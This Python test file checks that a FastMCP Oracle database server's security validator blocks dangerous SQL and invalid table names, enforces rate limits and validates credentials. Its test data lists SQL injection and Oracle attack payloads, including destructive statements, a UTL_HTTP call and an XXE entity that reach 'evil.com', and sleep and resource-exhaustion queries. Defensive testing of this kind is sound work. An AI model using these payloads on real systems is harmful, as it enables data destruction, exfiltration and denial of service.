"""
Property-based test for security feature preservation in FastMCP implementation
Tests Property 4: Security Feature Preservation
Feature: python-mcp-to-fast-mcp-migration, Property 4: Security Feature Preservation
"""

import pytest
import os
import time
import asyncio
from unittest.mock import patch, MagicMock, AsyncMock
from hypothesis import given, strategies as st, assume
from pathlib import Path

# Import FastMCP implementation components
from main import SecurityValidator, RateLimiter, _load_config
from config.loader import EnhancedConfigLoader
from config.security import validate_environment_security, validate_credential_format


# Strategy for generating valid database configuration parameters
valid_config_params = st.fixed_dictionaries({
    'host': st.sampled_from(['localhost', 'oracle-server.company.com', 'db.example.com']),
    'port': st.integers(min_value=1521, max_value=1530),
    'service_name': st.sampled_from(['PROD_SERVICE', 'DEV_SERVICE', 'TEST_SERVICE']),
    'username': st.text(
        min_size=3,
        max_size=20,
        alphabet=st.characters(
            min_codepoint=ord('a'),
            max_codepoint=ord('z')
        )
    ).filter(lambda x: len(x) >= 3),
    'password': st.text(
        min_size=8,
        max_size=50,
        alphabet=st.characters(
            min_codepoint=32,
            max_codepoint=126,
            blacklist_characters='\n\r\t\0'
        )
    ).filter(lambda x: x.strip() and len(x.strip()) >= 8 and any(c.isalnum() for c in x)),
    'connection_timeout': st.integers(min_value=10, max_value=300),
    'query_timeout': st.integers(min_value=30, max_value=1800),
    'max_rows': st.integers(min_value=100, max_value=5000)
})

# Strategy for generating valid SQL queries
valid_sql_queries = st.sampled_from([
    "SELECT * FROM users",
    "SELECT name, email FROM customers WHERE id = 1",
    "SELECT COUNT(*) FROM orders",
    "SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id",
    "SELECT * FROM products WHERE category = 'electronics'",
    "SELECT DISTINCT category FROM products",
    "SELECT AVG(price) FROM products WHERE category = 'books'"
])

# Strategy for generating dangerous SQL queries that should be blocked
dangerous_sql_queries = st.sampled_from([
    "INSERT INTO users VALUES (1, 'test')",
    "UPDATE users SET name = 'hacker'",
    "DELETE FROM users",
    "DROP TABLE users",
    "CREATE TABLE malicious (id INT)",
    "ALTER TABLE users ADD COLUMN hacked VARCHAR(100)",
    "TRUNCATE TABLE users",
    "GRANT ALL PRIVILEGES ON users TO hacker",
    "REVOKE SELECT ON users FROM public",
    "SELECT * FROM users; DROP TABLE users;",
    "SELECT * FROM users UNION SELECT * FROM passwords",
    "EXEC sp_configure",
    "EXECUTE IMMEDIATE 'DROP TABLE users'",
    "SELECT * FROM users -- comment",
    "SELECT * FROM users /* block comment */",
    "SELECT * FROM users WHERE 1=1; DELETE FROM users",
    "SELECT DBMS_XMLQUERY.getxml('SELECT * FROM users') FROM dual",
    "SELECT UTL_HTTP.request('http://evil.com') FROM dual",
    "SELECT SYS.DBMS_EXPORT_EXTENSION.get_domain_index_tables FROM dual"
])

# Strategy for generating valid table names (avoiding reserved words)
valid_table_names = st.sampled_from([
    "customers", "orders", "products", "employees", "departments",
    "CUSTOMERS", "ORDERS", "PRODUCTS", "EMPLOYEES", "DEPARTMENTS",
    "customer_profiles", "order_items", "product_categories",
    "employee_details", "department_info", "sales_data",
    "inventory", "transactions", "reports", "analytics"
])

# Strategy for generating invalid table names
invalid_table_names = st.sampled_from([
    "",  # Empty
    "123invalid",  # Starts with number
    "table-name",  # Contains hyphen
    "table name",  # Contains space
    "table;DROP",  # Contains semicolon
    "SYS",  # Reserved word
    "SYSTEM",  # Reserved word
    "DUAL",  # Reserved word
    "V$SESSION",  # System view pattern
    "X$TABLES",  # System table pattern
    "a" * 129,  # Too long
])


class TestSecurityFeaturePreservationFastMCP:
    """Property-based tests for security feature preservation in FastMCP implementation"""
    
    @given(query=valid_sql_queries)
    def test_security_validator_allows_valid_queries_fastmcp(self, query):
        """
        Property 4: Security Feature Preservation
        For any valid SQL query, the FastMCP SecurityValidator should allow it
        and maintain identical security behavior to the original implementation.
        
        **Validates: Requirements 5.1, 5.2, 5.3, 5.4, 5.5**
        """
        # Test SecurityValidator with valid queries
        is_valid, message = SecurityValidator.validate_query(query)
        
        # Valid queries should pass validation
        assert is_valid, f"Valid query '{query}' should pass security validation, but got: {message}"
        assert "validated" in message.lower(), f"Valid query should get validation success message, but got: {message}"
    
    @given(query=dangerous_sql_queries)
    def test_security_validator_blocks_dangerous_queries_fastmcp(self, query):
        """
        Property 4: Security Feature Preservation
        For any dangerous SQL query, the FastMCP SecurityValidator should block it
        and maintain identical security behavior to the original implementation.
        
        **Validates: Requirements 5.1, 5.2, 5.3, 5.4, 5.5**
        """
        # Test SecurityValidator with dangerous queries
        is_valid, message = SecurityValidator.validate_query(query)
        
        # Dangerous queries should be blocked
        assert not is_valid, f"Dangerous query '{query}' should be blocked, but was allowed"
        assert any(keyword in message.lower() for keyword in ['blocked', 'pattern', 'allowed', 'error']), (
            f"Blocked query should have appropriate error message, but got: {message}"
        )
    
    @given(table_name=valid_table_names)
    def test_security_validator_allows_valid_table_names_fastmcp(self, table_name):
        """
        Property 4: Security Feature Preservation
        For any valid table name, the FastMCP SecurityValidator should allow it
        and maintain identical security behavior to the original implementation.
        
        **Validates: Requirements 5.1, 5.2, 5.3, 5.4, 5.5**
        """
        # Test table name validation with valid names
        is_valid, message = SecurityValidator.validate_table_name(table_name)
        
        # Valid table names should pass validation
        assert is_valid, f"Valid table name '{table_name}' should pass validation, but got: {message}"
        assert "validated" in message.lower(), f"Valid table name should get validation success message, but got: {message}"
    
    @given(table_name=invalid_table_names)
    def test_security_validator_blocks_invalid_table_names_fastmcp(self, table_name):
        """
        Property 4: Security Feature Preservation
        For any invalid table name, the FastMCP SecurityValidator should block it
        and maintain identical security behavior to the original implementation.
        
        **Validates: Requirements 5.1, 5.2, 5.3, 5.4, 5.5**
        """
        # Test table name validation with invalid names
        is_valid, message = SecurityValidator.validate_table_name(table_name)
        
        # Invalid table names should be blocked
        assert not is_valid, f"Invalid table name '{table_name}' should be blocked, but was allowed"
        assert any(keyword in message.lower() for keyword in ['invalid', 'format', 'reserved', 'long', 'empty']), (
            f"Blocked table name should have appropriate error message, but got: {message}"
        )
    
    @given(
        max_requests=st.integers(min_value=5, max_value=50),
        window_seconds=st.integers(min_value=10, max_value=120)
    )
    def test_rate_limiter_enforces_limits_fastmcp(self, max_requests, window_seconds):
        """
        Property 4: Security Feature Preservation
        For any rate limiting configuration, the FastMCP RateLimiter should enforce limits
        and maintain identical security behavior to the original implementation.
        
        **Validates: Requirements 5.1, 5.2, 5.3, 5.4, 5.5**
        """
        # Create rate limiter with test parameters
        rate_limiter = RateLimiter(max_requests=max_requests, window_seconds=window_seconds)
        
        client_id = "test_client_property"
        
        # Should allow requests up to the limit
        allowed_count = 0
        for i in range(max_requests + 2):  # Try more than the limit
            is_allowed, message = rate_limiter.is_allowed(client_id)
            if is_allowed:
                allowed_count += 1
            else:
                # Should get proper error message when blocked
                assert "rate limit" in message.lower() or "exceeded" in message.lower(), (
                    f"Rate limit error should have appropriate message, but got: {message}"
                )
                break
        
        # Should allow exactly max_requests
        assert allowed_count == max_requests, (
            f"Rate limiter should allow exactly {max_requests} requests, "
            f"but allowed {allowed_count}"
        )
        
        # Additional requests should be blocked
        is_allowed, message = rate_limiter.is_allowed(client_id)
        assert not is_allowed, "Rate limiter should block requests after limit is reached"
        assert "rate limit" in message.lower() or "exceeded" in message.lower(), (
            f"Rate limit error should have appropriate message, but got: {message}"
        )
    
    @given(config_params=valid_config_params)
    def test_configuration_security_validation_preserved_fastmcp(self, config_params):
        """
        Property 4: Security Feature Preservation
        For any configuration parameters, the FastMCP implementation should preserve
        all security validation and maintain identical behavior to the original implementation.
        
        **Validates: Requirements 5.1, 5.2, 5.3, 5.4, 5.5**
        """
        # Store original environment to restore later
        original_env = os.environ.copy()
        
        try:
            # Clear environment first to ensure clean state
            for key in list(os.environ.keys()):
                if key.startswith('ORACLE_') or key in ['CONNECTION_TIMEOUT', 'QUERY_TIMEOUT', 'MAX_ROWS']:
                    del os.environ[key]
            
            # Set configuration environment variables
            os.environ.update({
                'ORACLE_HOST': config_params['host'],
                'ORACLE_PORT': str(config_params['port']),
                'ORACLE_SERVICE_NAME': config_params['service_name'],
                'ORACLE_USERNAME': config_params['username'],
                'ORACLE_PASSWORD': config_params['password'],
                'CONNECTION_TIMEOUT': str(config_params['connection_timeout']),
                'QUERY_TIMEOUT': str(config_params['query_timeout']),
                'MAX_ROWS': str(config_params['max_rows'])
            })
            
            # Test configuration loading with security preservation
            config = _load_config()
            
            # Verify configuration loaded correctly
            assert config.host == config_params['host'], "Host should match input"
            assert config.port == config_params['port'], "Port should match input"
            assert config.username == config_params['username'], "Username should match input"
            assert config.password == config_params['password'], "Password should match input"
            assert config.connection_timeout == config_params['connection_timeout'], "Connection timeout should match input"
            assert config.query_timeout == config_params['query_timeout'], "Query timeout should match input"
            assert config.max_rows == config_params['max_rows'], "Max rows should match input"
            
            # Verify security validations are working
            config_dict = {
                'host': config.host,
                'port': config.port,
                'username': config.username,
                'password': config.password,
                'connection_timeout': config.connection_timeout,
                'query_timeout': config.query_timeout,
                'max_rows': config.max_rows
            }
            
            # Security validation should work without errors
            security_warnings = validate_environment_security(config_dict)
            credential_errors = validate_credential_format(config.username, config.password)
            
            # Results should be lists (security features are preserved)
            assert isinstance(security_warnings, list), "Security warnings should be a list"
            assert isinstance(credential_errors, list), "Credential errors should be a list"
            
        finally:
            # Restore original environment
            os.environ.clear()
            os.environ.update(original_env)
    
    @given(
        client_id=st.text(min_size=1, max_size=50, alphabet=st.characters(min_codepoint=32, max_codepoint=126)).filter(lambda x: x.strip()),
        max_requests=st.integers(min_value=3, max_value=20)
    )
    def test_rate_limiter_session_based_tracking_fastmcp(self, client_id, max_requests):
        """
        Property 4: Security Feature Preservation
        For any client session, the FastMCP RateLimiter should maintain session-based tracking
        and preserve identical security behavior to the original implementation.
        
        **Validates: Requirements 5.1, 5.2, 5.3, 5.4, 5.5**
        """
        # Clean client_id to avoid issues
        client_id = client_id.strip()
        assume(len(client_id) > 0)
        
        # Create rate limiter
        rate_limiter = RateLimiter(max_requests=max_requests, window_seconds=60)
        
        # Test session-based tracking
        for i in range(max_requests):
            is_allowed, message = rate_limiter.is_allowed(client_id)
            assert is_allowed, f"Request {i+1} should be allowed for client {client_id}"
        
        # Next request should be blocked
        is_allowed, message = rate_limiter.is_allowed(client_id)
        assert not is_allowed, f"Request {max_requests+1} should be blocked for client {client_id}"
        
        # Different client should still be allowed
        different_client = f"{client_id}_different"
        is_allowed, message = rate_limiter.is_allowed(different_client)
        assert is_allowed, f"Different client should be allowed: {different_client}"
        
        # Get client status should work
        status = rate_limiter.get_client_status(client_id)
        assert isinstance(status, dict), "Client status should be a dictionary"
        assert 'blocked' in status, "Status should include blocked field"
        assert 'requests_used' in status, "Status should include requests_used field"
        assert 'requests_remaining' in status, "Status should include requests_remaining field"
    
    def test_security_validator_comprehensive_oracle_patterns_fastmcp(self):
        """
        Property 4: Security Feature Preservation
        The FastMCP SecurityValidator should block Oracle-specific attack patterns
        and maintain comprehensive security coverage.
        
        **Validates: Requirements 5.1, 5.2, 5.3, 5.4, 5.5**
        """
        # Test Oracle-specific dangerous patterns
        oracle_attacks = [
            "SELECT DBMS_XMLQUERY.getxml('SELECT * FROM users') FROM dual",
            "SELECT UTL_HTTP.request('http://evil.com') FROM dual",
            "SELECT SYS.DBMS_EXPORT_EXTENSION.get_domain_index_tables FROM dual",
            "SELECT DBMS_PIPE.receive_message('test') FROM dual",
            "SELECT DBMS_LOCK.sleep(10) FROM dual",
            "SELECT JAVA_CALL('java.lang.System.exit', 1) FROM dual",
            "SELECT CHR(65)||CHR(66) FROM dual WHERE 1=(SELECT COUNT(*) FROM users)",
            "SELECT * FROM dual CONNECT BY LEVEL <= 1000000",
            "SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://evil.com/\"> %remote;]>'), '/root') FROM dual"
        ]
        
        for attack_query in oracle_attacks:
            is_valid, message = SecurityValidator.validate_query(attack_query)
            assert not is_valid, f"Oracle attack pattern should be blocked: {attack_query}"
            assert any(keyword in message.lower() for keyword in ['blocked', 'pattern', 'error']), (
                f"Oracle attack should have appropriate error message: {message}"
            )
    
    @given(
        username=st.text(min_size=1, max_size=30, alphabet=st.characters(min_codepoint=32, max_codepoint=126)).filter(lambda x: x.strip()),
        password=st.text(min_size=1, max_size=50, alphabet=st.characters(min_codepoint=32, max_codepoint=126)).filter(lambda x: x.strip())
    )
    def test_credential_validation_consistency_fastmcp(self, username, password):
        """
        Property 4: Security Feature Preservation
        For any credentials, the FastMCP implementation should apply consistent validation
        and maintain identical security behavior to the original implementation.
        
        **Validates: Requirements 5.1, 5.2, 5.3, 5.4, 5.5**
        """
        # Clean inputs
        username = username.strip()
        password = password.strip()
        assume(len(username) > 0 and len(password) > 0)
        
        # Test credential validation
        errors = validate_credential_format(username, password)
        
        # Should always return a list
        assert isinstance(errors, list), "Credential validation should return a list"
        
        # Check validation logic consistency
        if len(username) < 2:
            assert any("username" in error.lower() and "2 characters" in error.lower() for error in errors), (
                "Short username should trigger validation error"
            )
        
        if len(password) < 6:
            assert any("password" in error.lower() and "6 characters" in error.lower() for error in errors), (
                "Short password should trigger validation error"
            )
        
        # Valid format usernames should not trigger format errors
        if len(username) >= 2 and username[0].isalpha() and all(c.isalnum() or c == '_' for c in username):
            format_errors = [e for e in errors if "username" in e.lower() and "format" in e.lower()]
            assert len(format_errors) == 0, f"Valid username format should not trigger format errors: {format_errors}"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])